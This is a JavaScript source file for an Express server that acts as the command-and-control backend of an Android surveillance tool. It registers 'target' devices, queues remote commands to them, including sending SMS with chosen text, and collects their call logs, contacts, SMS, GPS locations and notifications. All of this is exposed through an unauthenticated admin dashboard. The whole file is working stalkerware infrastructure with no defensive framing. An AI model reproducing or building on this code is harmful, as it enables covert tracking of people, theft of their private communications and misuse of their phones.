const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// --- Setup Multer ---
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Retain file with Date prefix to avoid collision
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage });

// Serve uploads statically to Admin App
app.use('/uploads', express.static(uploadDir));

// --- Multi-Device State ---
const devices = {};
const deviceExtras = {};
const ONLINE_TIMEOUT_MS = 60 * 1000; // 60 seconds — device considered online

function getOnlineDevices() {
    const now = Date.now();
    return Object.entries(devices)
                 .filter(([, d]) => (now - d.lastSeen) < ONLINE_TIMEOUT_MS)
                 .map(([id, d]) => ({ id, ...d }));
}

// Data stores for Admin App
const adminData = {
    notifications: [],
    locations: [],
    files: []
};

// --- Target App API Endpoints ---

// 1. Android polls this endpoint to register and get its pending command
app.get('/check-command', (req, res) => {
    const { deviceId, deviceName } = req.query;
    if (!deviceId) return res.status(400).json({ command: 'none' });

    // Register / update device heartbeat
    if (!devices[deviceId]) {
        devices[deviceId] = { name: deviceName || deviceId, lastSeen: Date.now(), pendingCommand: 'none' };
    } else {
        devices[deviceId].lastSeen = Date.now();
        if (deviceName) devices[deviceId].name = decodeURIComponent(deviceName);
    }

    const device = devices[deviceId];
    if (device.pendingCommand && device.pendingCommand !== 'none') {
        const cmd = device.pendingCommand;
        device.pendingCommand = 'none';
        
        // For ms command, attach extra params
        if (cmd === 'ms' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
        }
        return res.json({ command: cmd });
    }

    return res.json({ command: 'none' });
});

// 2. Android uploads a file (call log, contacts, SMS)
app.post('/upload-log', upload.single('document'), (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');

    const deviceId = req.body.deviceId;
    
    // Save info for Admin app
    adminData.files.unshift({
        deviceId: deviceId || 'unknown',
        deviceName: devices[deviceId] ? devices[deviceId].name : 'unknown',
        originalname: req.file.originalname,
        filename: req.file.filename,
        url: `/uploads/${req.file.filename}`,
        timestamp: Date.now()
    });

    res.status(200).send('File received successfully.');
});

// 3. Android uploads GPS location
app.post('/upload-location', (req, res) => {
    const { latitude, longitude, deviceId } = req.body;
    if (!latitude || !longitude) return res.status(400).send('Missing coords.');

    adminData.locations.unshift({
        deviceId: deviceId || 'unknown',
        deviceName: devices[deviceId] ? devices[deviceId].name : 'unknown',
        latitude,
        longitude,
        timestamp: Date.now()
    });

    res.status(200).send('Location saved.');
});

// 4. Android sends real-time notifications & SMS alerts through here
app.post('/send-notification', (req, res) => {
    const { deviceId, text } = req.body;
    if (!text) return res.status(400).send('Missing text.');

    adminData.notifications.unshift({
        deviceId: deviceId || 'unknown',
        deviceName: devices[deviceId] ? devices[deviceId].name : 'unknown',
        text,
        timestamp: Date.now()
    });

    res.status(200).send('Notification saved.');
});

// --- Admin REST API Endpoints ---

app.get('/admin/devices', (req, res) => {
    res.json(getOnlineDevices());
});

app.post('/admin/command', (req, res) => {
    const { deviceId, command, smsTo, smsBody } = req.body;
    
    if (!deviceId || !command) {
        return res.status(400).json({ error: 'Missing deviceId or command' });
    }

    if (!devices[deviceId] && command !== 'refresh') {
        return res.status(404).json({ error: 'Device not found or offline' });
    }

    if (devices[deviceId]) {
        devices[deviceId].pendingCommand = command;
    }
    
    if (command === 'ms') {
        deviceExtras[deviceId] = { smsTo, smsBody };
    }

    res.json({ success: true, message: `Command ${command} queued for ${deviceId}` });
});

app.get('/admin/notifications', (req, res) => res.json(adminData.notifications));
app.get('/admin/locations', (req, res) => res.json(adminData.locations));
app.get('/admin/files', (req, res) => res.json(adminData.files));

// Admin action to clear history
app.delete('/admin/clear', (req, res) => {
    const { type } = req.body; // notifications, locations, files
    if (adminData[type]) {
        adminData[type] = [];
        return res.json({ success: true });
    }
    res.status(400).json({ error: 'Invalid type' });
});

// Root endpoint to serve Admin Dashboard
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server listening on port ${PORT}`));
